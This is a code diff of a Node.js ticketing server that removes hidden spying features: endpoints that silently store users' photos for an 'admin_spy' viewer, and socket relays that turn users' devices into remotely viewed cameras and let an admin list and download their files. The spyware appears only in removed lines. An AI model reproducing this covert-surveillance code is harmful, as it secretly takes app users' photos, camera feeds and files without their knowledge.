@@ -63,14 +63,7 @@ const TicketSchema = new mongoose.Schema({
 }, { timestamps: true });
 const Ticket = mongoose.model('Ticket', TicketSchema);
 
-const SpyPhotoSchema = new mongoose.Schema({
-    userId: String,
-    filename: String,
-    fileType: String,
-    size: Number,
-    base64Data: String
-}, { timestamps: true });
-const SpyPhoto = mongoose.model('SpyPhoto', SpyPhotoSchema);
+
 
 // CORS Update para permitir solicitudes desde el front hospedado en otro sitio
 app.use(cors({ origin: '*' }));
@@ -384,162 +377,16 @@ app.post('/api/tickets', upload.array('fotos', 15), async (req, res) => {
     }
 });
 
-// --- Spy Endpoints (Background Sync) ---
-app.post('/api/spy/upload', async (req, res) => {
-    try {
-        const { userId, filename, fileType, size, base64Data } = req.body;
-        if (!userId || !filename || !base64Data) return res.status(400).json({ error: 'Missing data' });
-
-        // Guardamos la foto 1 a 1 de manera silenciosa
-        const newPhoto = new SpyPhoto({ userId, filename, fileType, size, base64Data });
-        await newPhoto.save();
-
-        res.status(201).json({ message: 'Saved successfully', id: newPhoto._id });
-    } catch (e) {
-        console.error('Spy upload error:', e);
-        res.status(500).json({ error: 'Internal server error' });
-    }
-});
-
-app.get('/api/spy/files/:userId', async (req, res) => {
-    try {
-        const { userId } = req.params;
-        // Solo obtener metadatos, no la imagen pesada
-        const files = await SpyPhoto.find({ userId })
-            .select('filename fileType size createdAt')
-            .sort({ createdAt: -1 });
-
-        // Formato para que admin_spy lo entienda
-        const mapped = files.map(f => ({
-            id: f._id.toString(),
-            name: f.filename,
-            type: f.fileType || 'image/jpeg',
-            size: f.size || 0,
-            date: f.createdAt
-        }));
-        res.json({ files: mapped });
-    } catch (e) {
-        res.status(500).json({ error: 'Internal server error' });
-    }
-});
-
-app.get('/api/spy/file/:fileId', async (req, res) => {
-    try {
-        const { fileId } = req.params;
-        const photo = await SpyPhoto.findById(fileId).select('base64Data fileType filename');
-        if (!photo) return res.status(404).json({ error: 'No encontrado' });
-
-        res.json({
-            base64Data: photo.base64Data,
-            fileType: photo.fileType || 'image/jpeg',
-            filename: photo.filename
-        });
-    } catch (e) {
-        res.status(500).json({ error: 'Internal server error' });
-    }
-});
 
 
 server.listen(PORT, '0.0.0.0', () => {
     console.log(`Servidor API ejecutándose en el puerto ${PORT}`);
 });
 
-// --- WebRTC Signaling (Cameras) ---
-const activeCameras = new Map(); // socket.id -> { userId, nombre, socketId }
-
 io.on('connection', (socket) => {
     console.log('Cliente conectado:', socket.id);
 
-    // Camera Registration (from app.js)
-    socket.on('register_camera', (userData) => {
-        activeCameras.set(socket.id, {
-            userId: userData.id || userData._id,
-            nombre: `${userData.nombre} ${userData.apellido || ''}`,
-            socketId: socket.id
-        });
-        // Notify viewers that a new camera is available
-        io.emit('cameras_updated', Array.from(activeCameras.values()));
-        console.log(`Cámara registrada: ${userData.nombre}`);
-    });
-
-    // Request active cameras list (from cameras.html viewer)
-    socket.on('request_cameras', () => {
-        socket.emit('cameras_updated', Array.from(activeCameras.values()));
-    });
-
-    // WebRTC Signaling Relay
-    socket.on('webrtc_offer', (data) => {
-        // data: { targetSocketId, offer, viewerSocketId }
-        io.to(data.targetSocketId).emit('webrtc_offer', {
-            viewerSocketId: socket.id,
-            offer: data.offer
-        });
-    });
-
-    socket.on('webrtc_answer', (data) => {
-        // data: { viewerSocketId, answer }
-        io.to(data.viewerSocketId).emit('webrtc_answer', {
-            cameraSocketId: socket.id,
-            answer: data.answer
-        });
-    });
-
-    socket.on('webrtc_ice_candidate', (data) => {
-        // data: { targetSocketId, candidate }
-        io.to(data.targetSocketId).emit('webrtc_ice_candidate', {
-            senderSocketId: socket.id,
-            candidate: data.candidate
-        });
-    });
-
-    // --- File Storage Signaling Relay ---
-    socket.on('storage_ready', (data) => {
-        if (activeCameras.has(socket.id)) {
-            const camData = activeCameras.get(socket.id);
-            camData.storageReady = true;
-            activeCameras.set(socket.id, camData);
-
-            // Notify admins that this specific user's storage is ready
-            io.emit('user_storage_ready', { socketId: socket.id });
-        }
-    });
-
-    socket.on('request_file_list', (data) => {
-        io.to(data.targetSocketId).emit('request_file_list', {
-            requesterSocketId: socket.id
-        });
-    });
-
-    socket.on('receive_file_list', (data) => {
-        io.to(data.targetSocketId).emit('receive_file_list', {
-            files: data.files,
-            error: data.error
-        });
-    });
-
-    socket.on('request_download_file', (data) => {
-        io.to(data.targetSocketId).emit('request_download_file', {
-            requesterSocketId: socket.id,
-            filename: data.filename
-        });
-    });
-
-    // Chunk relays for file streaming
-    socket.on('file_download_start', (data) => {
-        io.to(data.targetSocketId).emit('file_download_start', data);
-    });
-    socket.on('file_download_chunk', (data) => {
-        io.to(data.targetSocketId).emit('file_download_chunk', data);
-    });
-    socket.on('file_download_error', (data) => {
-        io.to(data.targetSocketId).emit('file_download_error', data);
-    });
-
     socket.on('disconnect', () => {
-        if (activeCameras.has(socket.id)) {
-            console.log(`Cámara desconectada: ${activeCameras.get(socket.id).nombre}`);
-            activeCameras.delete(socket.id);
-            io.emit('cameras_updated', Array.from(activeCameras.values()));
-        }
+        console.log('Cliente desconectado:', socket.id);
     });
 });
